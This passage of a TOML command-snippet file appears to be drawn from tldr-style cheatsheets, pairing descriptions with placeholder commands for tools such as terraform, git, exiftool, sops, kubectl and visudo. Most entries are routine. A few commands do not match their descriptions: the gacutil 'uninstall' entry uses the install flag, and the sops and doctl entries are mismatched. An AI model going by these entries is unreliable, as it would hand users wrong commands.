  description = "Format configuration according to Terraform language style conventions"
  command = "terraform fmt"
  output = ""

[[snippets]]
  description = "Generate and show an execution plan"
  command = "terraform plan"
  output = ""

[[snippets]]
  description = "Build or change infrastructure"
  command = "terraform apply"
  output = ""

[[snippets]]
  description = "Destroy Terraform-managed infrastructure"
  command = "terraform destroy"
  output = ""

[[snippets]]
  description = "Compress executable"
  command = "upx <path/to/file>"
  output = ""

[[snippets]]
  description = "Decompress executable"
  command = "upx -d <path/to/file>"
  output = ""

[[snippets]]
  description = "Detailed help"
  command = "upx --help"
  output = ""

[[snippets]]
  description = "Start a process with a name that can be used for later operations"
  command = "pm2 start <app.js> --name <application_name>"
  output = ""

[[snippets]]
  description = "List processes"
  command = "pm2 list"
  output = ""

[[snippets]]
  description = "Monitor all processes"
  command = "pm2 monit"
  output = ""

[[snippets]]
  description = "Stop a process"
  command = "pm2 stop <application_name>"
  output = ""

[[snippets]]
  description = "Restart a process"
  command = "pm2 restart <application_name>"
  output = ""

[[snippets]]
  description = "Dump all processes for resurrecting them later"
  command = "pm2 save"
  output = ""

[[snippets]]
  description = "Resurrect previously dumped processes"
  command = "pm2 resurrect"
  output = ""

[[snippets]]
  description = "Generate an RSA private key of 2048 bits to `stdout`"
  command = "openssl genrsa"
  output = ""

[[snippets]]
  description = "Save an RSA private key of an arbitrary number of bits to the output file"
  command = "openssl genrsa -out <output_file.key> <1234>"
  output = ""

[[snippets]]
  description = "Generate an RSA private key and encrypt it with AES256 (you will be prompted for a passphrase)"
  command = "openssl genrsa <-aes256>"
  output = ""

[[snippets]]
  description = "Create a specification for a class"
  command = "phpspec describe <class_name>"
  output = ""

[[snippets]]
  description = "Run all specifications in the "spec" directory"
  command = "phpspec run"
  output = ""

[[snippets]]
  description = "Run a single specification"
  command = "phpspec run <path/to/class_specification_file>"
  output = ""

[[snippets]]
  description = "Run specifications using a specific configuration file"
  command = "phpspec run -c <path/to/configuration_file>"
  output = ""

[[snippets]]
  description = "Run specifications using a specific bootstrap file"
  command = "phpspec run -b <path/to/bootstrap_file>"
  output = ""

[[snippets]]
  description = "Disable code generation prompts"
  command = "phpspec run --no-code-generation"
  output = ""

[[snippets]]
  description = "Enable fake return values"
  command = "phpspec run --fake"
  output = ""

[[snippets]]
  description = "Build a `.js` or `.vue` file in production mode with zero config"
  command = "vue build <filename>"
  output = ""

[[snippets]]
  description = "Add files or directories to the staging area"
  command = "hg add <path/to/file>"
  output = ""

[[snippets]]
  description = "Add all unstaged files matching a specified pattern"
  command = "hg add --include <pattern>"
  output = ""

[[snippets]]
  description = "Add all unstaged files, excluding those that match a specified pattern"
  command = "hg add --exclude <pattern>"
  output = ""

[[snippets]]
  description = "Recursively add sub-repositories"
  command = "hg add --subrepos"
  output = ""

[[snippets]]
  description = "Perform a test-run without performing any actions"
  command = "hg add --dry-run"
  output = ""

[[snippets]]
  description = "Check the code in a specific directory for deprecations"
  command = "drupal-check <path/to/directory>"
  output = ""

[[snippets]]
  description = "Check the code excluding a comma-separated list of directories"
  command = "drupal-check --exclude-dir <path/to/excluded_directory>,<path/to/excluded_files/*.php> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Don't show a progress bar"
  command = "drupal-check --no-progress <path/to/directory>"
  output = ""

[[snippets]]
  description = "Perform static analysis to detect bad coding practices"
  command = "drupal-check --analysis <path/to/directory>"
  output = ""

[[snippets]]
  description = "Open a file"
  command = "micro <path/to/file>"
  output = ""

[[snippets]]
  description = "Save a file"
  command = "<Ctrl> + S"
  output = ""

[[snippets]]
  description = "Cut the entire line"
  command = "<Ctrl> + K"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file (press `Ctrl + N`/`Ctrl + P` to go to next/previous match)"
  command = "<Ctrl> + F ""<pattern>"" <Enter>"
  output = ""

[[snippets]]
  description = "Execute a command"
  command = "<Ctrl> + E <command> <Enter>"
  output = ""

[[snippets]]
  description = "Perform a substitution in the whole file"
  command = "<Ctrl> + E replaceall ""<pattern>"" ""<replacement>"" <Enter>"
  output = ""

[[snippets]]
  description = "Quit"
  command = "<Ctrl> + Q"
  output = ""

[[snippets]]
  description = "Create a new virtual machine or update an existing one (if available)"
  command = "makebuildserver"
  output = ""

[[snippets]]
  description = "Force creating a fresh virtual machine"
  command = "makebuildserver --clean"
  output = ""

[[snippets]]
  description = "Install the specified assembly into GAC"
  command = "gacutil -i <path/to/assembly.dll>"
  output = ""

[[snippets]]
  description = "Uninstall the specified assembly from GAC"
  command = "gacutil -i <assembly_display_name>"
  output = ""

[[snippets]]
  description = "Print the content of GAC"
  command = "gacutil -l"
  output = ""

[[snippets]]
  description = "Open a compressed file"
  command = "zmore <path/to/file.txt.gz>"
  output = ""

[[snippets]]
  description = "Display the next page of the file"
  command = "<Space>"
  output = ""

[[snippets]]
  description = "Search for a pattern in the file (press `n` to go to next match)"
  command = "/<regular_expression>"
  output = ""

[[snippets]]
  description = "Exit"
  command = "q"
  output = ""

[[snippets]]
  description = "Display interactive command help"
  command = "h"
  output = ""

[[snippets]]
  description = "Display the file header information"
  command = "objdump -f <binary>"
  output = ""

[[snippets]]
  description = "Display all header information"
  command = "objdump -x <binary>"
  output = ""

[[snippets]]
  description = "Display the disassembled output of executable sections"
  command = "objdump -d <binary>"
  output = ""

[[snippets]]
  description = "Display the disassembled executable sections in intel syntax"
  command = "objdump -M intel -d <binary>"
  output = ""

[[snippets]]
  description = "Display a complete binary hex dump of all sections"
  command = "objdump -s <binary>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr chromium"
  output = ""

[[snippets]]
  description = "Open specific files"
  command = "kate <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Open specific remote files"
  command = "kate <https://example.com/path/to/file1 https://example.com/path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Create a new editor instance even if one is already open"
  command = "kate --new"
  output = ""

[[snippets]]
  description = "Open a file with the cursor at the specific line"
  command = "kate --line <line_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Open a file with the cursor at the specific line and column"
  command = "kate --line <line_number> --column <column_number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a file from `stdin`"
  command = "cat <path/to/file> | kate --stdin"
  output = ""

[[snippets]]
  description = "Display help"
  command = "kate --help"
  output = ""

[[snippets]]
  description = "Send local changes in the current branch to its default remote counterpart"
  command = "git push"
  output = ""

[[snippets]]
  description = "Send changes from a specific local branch to its remote counterpart"
  command = "git push <remote_name> <local_branch>"
  output = ""

[[snippets]]
  description = "Send changes from a specific local branch to its remote counterpart, and set the remote one as the default push/pull target of the local one"
  command = "git push -u <remote_name> <local_branch>"
  output = ""

[[snippets]]
  description = "Send changes from a specific local branch to a specific remote branch"
  command = "git push <remote_name> <local_branch>:<remote_branch>"
  output = ""

[[snippets]]
  description = "Send changes on all local branches to their counterparts in a given remote repository"
  command = "git push --all <remote_name>"
  output = ""

[[snippets]]
  description = "Delete a branch in a remote repository"
  command = "git push <remote_name> --delete <remote_branch>"
  output = ""

[[snippets]]
  description = "Remove remote branches that don't have a local counterpart"
  command = "git push --prune <remote_name>"
  output = ""

[[snippets]]
  description = "Publish tags that aren't yet in the remote repository"
  command = "git push --tags"
  output = ""

[[snippets]]
  description = "Show the structure of a Type built-in of the .NET Framework"
  command = "monop <System.String>"
  output = ""

[[snippets]]
  description = "List the types in an assembly"
  command = "monop -r:<path/to/assembly.exe>"
  output = ""

[[snippets]]
  description = "Show the structure of a Type in a specific assembly"
  command = "monop -r:<path/to/assembly.dll> <Namespace.Path.To.Type>"
  output = ""

[[snippets]]
  description = "Only show members defined in the specified Type"
  command = "monop -r:<path/to/assembly.dll> --only-declared <Namespace.Path.To.Type>"
  output = ""

[[snippets]]
  description = "Show private members"
  command = "monop -r:<path/to/assembly.dll> --private <Namespace.Path.To.Type>"
  output = ""

[[snippets]]
  description = "Hide obsolete members"
  command = "monop -r:<path/to/assembly.dll> --filter-obsolete <Namespace.Path.To.Type>"
  output = ""

[[snippets]]
  description = "List the other assemblies that a specified assembly references"
  command = "monop -r:<path/to/assembly.dll> --refs"
  output = ""

[[snippets]]
  description = "Create a new rails project"
  command = "rails new ""<project_name>"""
  output = ""

[[snippets]]
  description = "Start local server for current project on port 3000"
  command = "rails server"
  output = ""

[[snippets]]
  description = "Start local server for current project on a specified port"
  command = "rails server -p ""<port>"""
  output = ""

[[snippets]]
  description = "Open console to interact with application from command-line"
  command = "rails console"
  output = ""

[[snippets]]
  description = "Check current version of rails"
  command = "rails --version"
  output = ""

[[snippets]]
  description = "Show why the currently running NixOS system requires a certain store path"
  command = "nix why-depends </run/current-system> </nix/store/...>"
  output = ""

[[snippets]]
  description = "Show why a package from nixpkgs requires another package as a _build-time_ dependency"
  command = "nix why-depends --derivation <nixpkgs#dependent> <nixpkgs#dependency>"
  output = ""

[[snippets]]
  description = "Display the type of a command"
  command = "type <command>"
  output = ""

[[snippets]]
  description = "Display all locations containing the specified executable"
  command = "type -a <command>"
  output = ""

[[snippets]]
  description = "Display the name of the disk file that would be executed"
  command = "type -p <command>"
  output = ""

[[snippets]]
  description = "Capture the entire X server screen into a PostScript file"
  command = "import -window root <path/to/output.ps>"
  output = ""

[[snippets]]
  description = "Capture contents of a remote X server screen into a PNG image"
  command = "import -window root -display <remote_host>:<screen>.<display> <path/to/output.png>"
  output = ""

[[snippets]]
  description = "Capture a specific window given its ID as displayed by `xwininfo` into a JPEG image"
  command = "import -window <window_id> <path/to/output.jpg>"
  output = ""

[[snippets]]
  description = "Move the cursor to a screen location"
  command = "tput cup <row> <column>"
  output = ""

[[snippets]]
  description = "Set foreground (af) or background (ab) color"
  command = "tput <setaf|setab> <ansi_color_code>"
  output = ""

[[snippets]]
  description = "Show number of columns, lines, or colors"
  command = "tput <cols|lines|colors>"
  output = ""

[[snippets]]
  description = "Ring the terminal bell"
  command = "tput bel"
  output = ""

[[snippets]]
  description = "Reset all terminal attributes"
  command = "tput sgr0"
  output = ""

[[snippets]]
  description = "Enable or disable word wrap"
  command = "tput <smam|rmam>"
  output = ""

[[snippets]]
  description = "Print the EXIF metadata for a given file"
  command = "exiftool <path/to/file>"
  output = ""

[[snippets]]
  description = "Remove all EXIF metadata from the given files"
  command = "exiftool -All= <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Remove GPS EXIF metadata from given image files"
  command = "exiftool ""-gps*="" <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Remove all EXIF metadata from the given image files, then re-add metadata for color and orientation"
  command = "exiftool -All= -tagsfromfile @ -colorspacetags -orientation <path/to/image1 path/to/image2 ...>"
  output = ""

[[snippets]]
  description = "Move the date at which all photos in a directory were taken 1 hour forward"
  command = "exiftool ""-AllDates+=0:0:0 1:0:0"" <path/to/directory>"
  output = ""

[[snippets]]
  description = "Move the date at which all JPEG photos in the current directory were taken 1 day and 2 hours backward"
  command = "exiftool ""-AllDates-=0:0:1 2:0:0"" -ext jpg"
  output = ""

[[snippets]]
  description = "Only change the `DateTimeOriginal` field subtracting 1.5 hours, without keeping backups"
  command = "exiftool -DateTimeOriginal-=1.5 -overwrite_original"
  output = ""

[[snippets]]
  description = "Recursively rename all JPEG photos in a directory based on the `DateTimeOriginal` field"
  command = "exiftool '-filename<DateTimeOriginal' -d %Y-%m-%d_%H-%M-%S%%lc.%%e <path/to/directory> -r -ext jpg"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "python"
  output = ""

[[snippets]]
  description = "Execute a specific Python file"
  command = "python <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Execute a specific Python file and start a REPL"
  command = "python -i <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Execute a Python expression"
  command = "python -c ""<expression>"""
  output = ""

[[snippets]]
  description = "Run the script of the specified library module"
  command = "python -m <module> <arguments>"
  output = ""

[[snippets]]
  description = "Install a package using `pip`"
  command = "python -m pip install <package>"
  output = ""

[[snippets]]
  description = "Interactively debug a Python script"
  command = "python -m pdb <path/to/file.py>"
  output = ""

[[snippets]]
  description = "Start the built-in HTTP server on port 8000 in the current directory"
  command = "python -m http.server"
  output = ""

[[snippets]]
  description = "Print a text message"
  command = "printf ""<%s\n>"" ""<Hello world>"""
  output = ""

[[snippets]]
  description = "Print an integer in bold blue"
  command = "printf ""<\e[1;34m%.3d\e[0m\n>"" <42>"
  output = ""

[[snippets]]
  description = "Print a float number with the Unicode Euro sign"
  command = "printf ""<\u20AC %.2f\n>"" <123.4>"
  output = ""

[[snippets]]
  description = "Print a text message composed with environment variables"
  command = "printf ""<var1: %s\tvar2: %s\n>"" ""<$VAR1>"" ""<$VAR2>"""
  output = ""

[[snippets]]
  description = "Store a formatted message in a variable (does not work on zsh)"
  command = "printf -v <myvar> <""This is %s = %d\n"" ""a year"" 2016>"
  output = ""

[[snippets]]
  description = "Compare two specific files"
  command = "xzcmp <path/to/file1> <path/to/file2>"
  output = ""

[[snippets]]
  description = "Encrypt a file"
  command = "sops -e <path/to/myfile.json> > <path/to/myfile.enc.json>"
  output = ""

[[snippets]]
  description = "Decrypt a file to `stdout`"
  command = "sops -d <path/to/myfile.enc.json>"
  output = ""

[[snippets]]
  description = "Rotate data keys for a sops file"
  command = "sops -r <path/to/myfile.enc.yaml>"
  output = ""

[[snippets]]
  description = "Change the extension of the file once encrypted"
  command = "sops -d --input-type json <path/to/myfile.enc.json>"
  output = ""

[[snippets]]
  description = "Extract keys by naming them, and array elements by numbering them"
  command = "sops -d --extract '[""an_array""][1]' <path/to/myfile.enc.json>"
  output = ""

[[snippets]]
  description = "Show the difference between two sops files"
  command = "diff <(sops -d <path/to/secret1.enc.yaml>) <(sops -d <path/to/secret2.enc.yaml>)"
  output = ""

[[snippets]]
  description = "List all buckets"
  command = "aws s3 ls"
  output = ""

[[snippets]]
  description = "List files and folders in the root of a bucket (`s3://` is optional)"
  command = "aws s3 ls s3://<bucket_name>"
  output = ""

[[snippets]]
  description = "List files and folders directly inside a directory"
  command = "aws s3 ls <bucket_name>/<path/to/directory>/"
  output = ""

[[snippets]]
  description = "List all files in a bucket"
  command = "aws s3 ls --recursive <bucket_name>"
  output = ""

[[snippets]]
  description = "List all files in a path with a given prefix"
  command = "aws s3 ls --recursive <bucket_name>/<path/to/directory/><prefix>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "aws s3 ls help"
  output = ""

[[snippets]]
  description = "Erase the existence of specific files"
  command = "git obliterate <file_1 file_2 ...>"
  output = ""

[[snippets]]
  description = "Erase the existence of specific files between 2 commits"
  command = "git obliterate <file_1 file_2 ...> -- <commit_hash_1>..<commit_hash_2>"
  output = ""

[[snippets]]
  description = "Filter all data records that had specific destinations and write them to a separate file"
  command = "sc_wartsfilter -i <path/to/input.warts> -o <path/to/output.warts> -a <192.0.2.5> -a <192.0.2.6>"
  output = ""

[[snippets]]
  description = "Filter all records that had certain destinations in a prefix and write them to a separate file"
  command = "sc_wartsfilter -i <path/to/input.warts> -o <path/to/output.warts> -a <2001:db8::/32>"
  output = ""

[[snippets]]
  description = "Filter all records that using a specific action and output them as JSON"
  command = "sc_wartsfilter -i <path/to/input.warts> -t <ping> | sc_warts2json"
  output = ""

[[snippets]]
  description = "Extract files with original directory structure"
  command = "unrar x <compressed.rar>"
  output = ""

[[snippets]]
  description = "Extract files to a specified path with the original directory structure"
  command = "unrar x <compressed.rar> <path/to/extract>"
  output = ""

[[snippets]]
  description = "Extract files into current directory, losing directory structure in the archive"
  command = "unrar e <compressed.rar>"
  output = ""

[[snippets]]
  description = "Test integrity of each file inside the archive file"
  command = "unrar t <compressed.rar>"
  output = ""

[[snippets]]
  description = "List files inside the archive file without decompressing it"
  command = "unrar l <compressed.rar>"
  output = ""

[[snippets]]
  description = "Restart a specific task"
  command = "pueue restart <task_id>"
  output = ""

[[snippets]]
  description = "Restart multiple tasks at once, and start them immediately (do not enqueue)"
  command = "pueue restart --start-immediately <task_id> <task_id>"
  output = ""

[[snippets]]
  description = "Restart a specific task from a different path"
  command = "pueue restart --edit-path <task_id>"
  output = ""

[[snippets]]
  description = "Edit a command before restarting"
  command = "pueue restart --edit <task_id>"
  output = ""

[[snippets]]
  description = "Restart a task in-place (without enqueuing as a separate task)"
  command = "pueue restart --in-place <task_id>"
  output = ""

[[snippets]]
  description = "Restart all failed tasks and stash them"
  command = "pueue restart --all-failed --stashed"
  output = ""

[[snippets]]
  description = "Connect to the local server"
  command = "redis-cli"
  output = ""

[[snippets]]
  description = "Connect to a remote server on the default port (6379)"
  command = "redis-cli -h <host>"
  output = ""

[[snippets]]
  description = "Connect to a remote server specifying a port number"
  command = "redis-cli -h <host> -p <port>"
  output = ""

[[snippets]]
  description = "Connect to a remote server specifying a URI"
  command = "redis-cli -u <uri>"
  output = ""

[[snippets]]
  description = "Specify a password"
  command = "redis-cli -a <password>"
  output = ""

[[snippets]]
  description = "Execute Redis command"
  command = "redis-cli <redis_command>"
  output = ""

[[snippets]]
  description = "Connect to the local cluster"
  command = "redis-cli -c"
  output = ""

[[snippets]]
  description = "Show logs for a single-container pod"
  command = "kubectl logs <pod_name>"
  output = ""

[[snippets]]
  description = "Show logs for a specified container in a pod"
  command = "kubectl logs --container <container_name> <pod_name>"
  output = ""

[[snippets]]
  description = "Show logs for all containers in a pod"
  command = "kubectl logs --all-containers=<true> <pod_name>"
  output = ""

[[snippets]]
  description = "Stream pod logs"
  command = "kubectl logs --follow <pod_name>"
  output = ""

[[snippets]]
  description = "Stream logs for a specified container in a pod"
  command = "kubectl logs --follow --container <container_name> <pod_name>"
  output = ""

[[snippets]]
  description = "Show pod logs newer than a relative time like `10s`, `5m`, or `1h`"
  command = "kubectl logs --since=<relative_time> <pod_name>"
  output = ""

[[snippets]]
  description = "Show the 10 most recent logs in a pod"
  command = "kubectl logs --tail=<10> <pod_name>"
  output = ""

[[snippets]]
  description = "Ping the specified URL"
  command = "httping -g <url>"
  output = ""

[[snippets]]
  description = "Ping the web server on `host` and `port`"
  command = "httping -h <host> -p <port>"
  output = ""

[[snippets]]
  description = "Ping the web server on `host` using a TLS connection"
  command = "httping -l -g https://<host>"
  output = ""

[[snippets]]
  description = "Ping the web server on `host` using HTTP basic authentication"
  command = "httping -g http://<host> -U <username> -P <password>"
  output = ""

[[snippets]]
  description = "Connect local serverless support to a functions namespace"
  command = "doctl serverless connect"
  output = ""

[[snippets]]
  description = "Deploy a functions project to your functions namespace"
  command = "doctl serverless deploy"
  output = ""

[[snippets]]
  description = "Obtain metadata of a functions project"
  command = "doctl serverless get-metadata"
  output = ""

[[snippets]]
  description = "Provide information about serverless support"
  command = "doctl serverless status"
  output = ""

[[snippets]]
  description = "List API Management services within a resource group"
  command = "az apim list --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Create an API Management service instance"
  command = "az apim create --name <name> --resource-group <resource_group> --publisher-email <email> --publisher-name <name>"
  output = ""

[[snippets]]
  description = "Delete an API Management service"
  command = "az apim delete --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Show details of an API Management service instance"
  command = "az apim show --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "Update an API Management service instance"
  command = "az apim update --name <name> --resource-group <resource_group>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr git-cola"
  output = ""

[[snippets]]
  description = "Run a `doctl databases replica` command with an access token"
  command = "doctl databases pool <command> --access-token <access_token>"
  output = ""

[[snippets]]
  description = "Retrieve information about a read-only database replica"
  command = "doctl databases replica get <database_id> <replica_name>"
  output = ""

[[snippets]]
  description = "Retrieve list of read-only database replicas"
  command = "doctl databases replica list <database_id>"
  output = ""

[[snippets]]
  description = "Create a read-only database replica"
  command = "doctl databases replica create <database_id> <replica_name>"
  output = ""

[[snippets]]
  description = "Delete a read-only database replica"
  command = "doctl databases replica delete <database_id> <replica_name>"
  output = ""

[[snippets]]
  description = "List files and directories in the current directory, one per line, with details"
  command = "vdir"
  output = ""

[[snippets]]
  description = "List with sizes displayed in human-readable units (KB, MB, GB)"
  command = "vdir -h"
  output = ""

[[snippets]]
  description = "List including hidden files (starting with a dot)"
  command = "vdir -a"
  output = ""

[[snippets]]
  description = "List files and directories sorting entries by size (largest first)"
  command = "vdir -S"
  output = ""

[[snippets]]
  description = "List files and directories sorting entries by modification time (newest first)"
  command = "vdir -t"
  output = ""

[[snippets]]
  description = "List grouping directories first"
  command = "vdir --group-directories-first"
  output = ""

[[snippets]]
  description = "Recursively list all files and directories in a specific directory"
  command = "vdir --recursive <path/to/directory>"
  output = ""

[[snippets]]
  description = "Install a role"
  command = "ansible-galaxy install <username>.<role_name>"
  output = ""

[[snippets]]
  description = "Remove a role"
  command = "ansible-galaxy remove <username>.<role_name>"
  output = ""

[[snippets]]
  description = "List installed roles"
  command = "ansible-galaxy list"
  output = ""

[[snippets]]
  description = "Search for a given role"
  command = "ansible-galaxy search <role_name>"
  output = ""

[[snippets]]
  description = "Create a new role"
  command = "ansible-galaxy init <role_name>"
  output = ""

[[snippets]]
  description = "Get information about a user role"
  command = "ansible-galaxy role info <username>.<role_name>"
  output = ""

[[snippets]]
  description = "Get information about a collection"
  command = "ansible-galaxy collection info <username>.<collection_name>"
  output = ""

[[snippets]]
  description = "Build and analyze the project in the current directory"
  command = "scan-build <make>"
  output = ""

[[snippets]]
  description = "Run a command and pass all subsequent options to it"
  command = "scan-build <command> <command_arguments>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "scan-build"
  output = ""

[[snippets]]
  description = "Print a specific character/field range of each line"
  command = "<command> | cut --<characters|fields>=<1|1,10|1-10|1-|-10>"
  output = ""

[[snippets]]
  description = "Print a field range of each line with a specific delimiter"
  command = "<command> | cut --delimiter=""<,>"" --fields=<1>"
  output = ""

[[snippets]]
  description = "Print a character range of each line of the specific file"
  command = "cut --characters=<1> <path/to/file>"
  output = ""

[[snippets]]
  description = "Create a mask bitmap separating background from foreground"
  command = "pbmmask <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Expand the generated mask by one pixel"
  command = "pbmmask -expand <path/to/image.pbm> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "List files from the current checked out branch that differ from the `main` branch"
  command = "git delta <main>"
  output = ""

[[snippets]]
  description = "List files from a specific branch that differ from another specific branch"
  command = "git delta <branch_1> <branch_2>"
  output = ""

[[snippets]]
  description = "Check a file for nits"
  command = "idnits <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Count nits without displaying them"
  command = "idnits --nitcount <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Show extra information about offending lines"
  command = "idnits --verbose <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Expect the specified year in the boilerplate instead of the current year"
  command = "idnits --year <2021> <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Assume the document is of the specified status"
  command = "idnits --doctype <standard|informational|experimental|bcp|ps|ds> <path/to/file.txt>"
  output = ""

[[snippets]]
  description = "Log in with interactive prompt"
  command = "glab auth login"
  output = ""

[[snippets]]
  description = "Log in with a token"
  command = "glab auth login --token <token>"
  output = ""

[[snippets]]
  description = "Check authentication status"
  command = "glab auth status"
  output = ""

[[snippets]]
  description = "Log in to a specific GitLab instance"
  command = "glab auth login --hostname <gitlab.example.com>"
  output = ""

[[snippets]]
  description = "Compile a shell script"
  command = "shc -f <script>"
  output = ""

[[snippets]]
  description = "Compile a shell script and specify an output binary file"
  command = "shc -f <script> -o <binary>"
  output = ""

[[snippets]]
  description = "Compile a shell script and set an expiration date for the executable"
  command = "shc -f <script> -e <dd/mm/yyyy>"
  output = ""

[[snippets]]
  description = "Compile a shell script and set a message to display upon expiration"
  command = "shc -f <script> -e <dd/mm/yyyy> -m ""<Please contact your provider>"""
  output = ""

[[snippets]]
  description = "Edit the sudoers file"
  command = "sudo visudo"
  output = ""

[[snippets]]
  description = "Check the sudoers file for errors"
  command = "sudo visudo -c"
  output = ""

[[snippets]]
  description = "Edit the sudoers file using a specific editor"
  command = "sudo EDITOR=<editor> visudo"
  output = ""

[[snippets]]
  description = "Display version information"
  command = "visudo --version"
  output = ""

[[snippets]]
  description = "Delete a tag"
  command = "git delete-tag <tag_version>"
  output = ""

[[snippets]]
  description = "Get pod details (from current namespace)"
  command = "findpod"
  output = ""

[[snippets]]
  description = "Get pod details (from all namespaces)"
  command = "findpod -a"
  output = ""

[[snippets]]
  description = "Describe a pod"
  command = "describepod"
  output = ""

[[snippets]]
  description = "Tail pod logs"
  command = "tailpod"
  output = ""

[[snippets]]
  description = "Exec into a pod's container"
  command = "execpod <shell_command>"
  output = ""

[[snippets]]
  description = "Port-forward a pod"
  command = "pfpod <port_number>"
  output = ""

[[snippets]]
  description = "Calculate the SHA256 checksum for one or more files"
  command = "sha256sum <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Calculate and save the list of SHA256 checksums to a file"
  command = "sha256sum <path/to/file1 path/to/file2 ...> > <path/to/file.sha256>"
  output = ""

[[snippets]]
  description = "Calculate a SHA256 checksum from `stdin`"
  command = "<command> | sha256sum"
  output = ""

[[snippets]]
  description = "Read a file of SHA256 sums and filenames and verify all files have matching checksums"
  command = "sha256sum --check <path/to/file.sha256>"
  output = ""

[[snippets]]
  description = "Only show a message for missing files or when verification fails"
  command = "sha256sum --check --quiet <path/to/file.sha256>"
  output = ""

[[snippets]]
  description = "Only show a message when verification fails, ignoring missing files"
  command = "sha256sum --ignore-missing --check --quiet <path/to/file.sha256>"
  output = ""

[[snippets]]
  description = "Configure `ia` with API keys (some functions won't work without this step)"
  command = "ia configure"
  output = ""

[[snippets]]
  description = "Upload one or more items to `archive.org`"
  command = "ia upload <identifier> <path/to/file> --metadata=""<mediatype:data>"" --metadata=""<title:example>"""
  output = ""

[[snippets]]
  description = "Download one or more items from `archive.org`"
  command = "ia download <item>"
  output = ""

[[snippets]]
  description = "Delete one or more items from `archive.org`"
  command = "ia delete <identifier> <file>"
  output = ""

[[snippets]]
  description = "Search on `archive.org`, returning results as JSON"
  command = "ia search '<subject:""subject"" collection:collection>'"
  output = ""

[[snippets]]
  description = "Render a single line of text as a PBM image"
  command = "pbmtext ""<Hello World!>"" > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Render multiple lines of text as a PBM image"
  command = "echo ""<Hello\nWorld!>"" | pbmtext > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Render text using a custom font supplied as a PBM file"
  command = "pbmtext -font <path/to/font.pbm> ""<Hello World!>"" > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Specify the number of pixels between characters and lines"
  command = "echo ""<Hello\nWorld!>"" | pbmtext -space <3> -lspace <10> > <path/to/output.pbm>"
  output = ""

[[snippets]]
  description = "Display system logs"
  command = "adb logcat"
  output = ""

[[snippets]]
  description = "Display lines that match a regular [e]xpression"
  command = "adb logcat -e <regular_expression>"
  output = ""

[[snippets]]
  description = "Display logs for a tag in a specific mode ([V]erbose, [D]ebug, [I]nfo, [W]arning, [E]rror, [F]atal, [S]ilent), filtering other tags"
  command = "adb logcat <tag>:<mode> *:S"
  output = ""

[[snippets]]
  description = "Display logs for React Native applications in [V]erbose mode [S]ilencing other tags"
  command = "adb logcat ReactNative:V ReactNativeJS:V *:S"
  output = ""

[[snippets]]
  description = "Display logs for all tags with priority level [W]arning and higher"
  command = "adb logcat *:W"
  output = ""

[[snippets]]
  description = "Display logs for a specific PID"
  command = "adb logcat --pid=<pid>"
  output = ""

[[snippets]]
  description = "Display logs for the process of a specific package"
  command = "adb logcat --pid=$(adb shell pidof -s <package>)"
  output = ""

[[snippets]]
  description = "Color the log (usually use with filters)"
  command = "adb logcat -v color"
  output = ""

[[snippets]]
  description = "Launch a specific application with arguments"
  command = "cs launch <application_name> -- <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Launch a specific application version with arguments"
  command = "cs launch <application_name>:<application_version> -- <argument1 argument2 ...>"
  output = ""

[[snippets]]
  description = "Launch a specific version of an application specifying which is the main file"
  command = "cs launch <group_id>:<artifact_id>:<artifact_version> --main-class <path/to/main_class_file>"
  output = ""

[[snippets]]
  description = "Launch an application with specific Java options and JVM memory ones"
  command = "cs launch --java-opt <-Doption_name1:option_value1 -Doption_name2:option_value2 ...> --java-opt <-Xjvm_option1 -Xjvm_option2 ...> <application_name>"
  output = ""

[[snippets]]
  description = "Start the project in the current directory"
  command = "fin project start"
  output = ""

[[snippets]]
  description = "Stop the project in the current directory"
  command = "fin project stop"
  output = ""

[[snippets]]
  description = "Open a shell into a specific container"
  command = "fin bash <container_name>"
  output = ""

[[snippets]]
  description = "Display logs of a specific container"
  command = "fin logs <container_name>"
  output = ""

[[snippets]]
  description = "Display logs of a specific container and follow the log"
  command = "fin logs -f <container_name>"
  output = ""

[[snippets]]
  description = "Create PGM image with a uniform gray level (specified as a number between 0 and 1) and the specified dimensions"
  command = "pgmmake <graylevel> <width> <height> > <path/to/output_file.pgm>"
  output = ""

[[snippets]]
  description = "Start a local meshname DNS server"
  command = "meshnamed"
  output = ""

[[snippets]]
  description = "Convert an IPv6 address into a meshname"
  command = "meshnamed -getname <200:6fc8:9220:f400:5cc2:305a:4ac6:967e>"
  output = ""

[[snippets]]
  description = "Convert a meshname to an IPv6 address"
  command = "meshnamed -getip <aiag7sesed2aaxgcgbnevruwpy>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "guile"
  output = ""

[[snippets]]
  description = "Execute the script in a given Scheme file"
  command = "guile <script.scm>"
  output = ""

[[snippets]]
  description = "Execute a Scheme expression"
  command = "guile -c ""<expression>"""
  output = ""

[[snippets]]
  description = "Listen on a port or a Unix domain socket (the default is port 37146) for remote REPL connections"
  command = "guile --listen=<port_or_socket>"
  output = ""

[[snippets]]
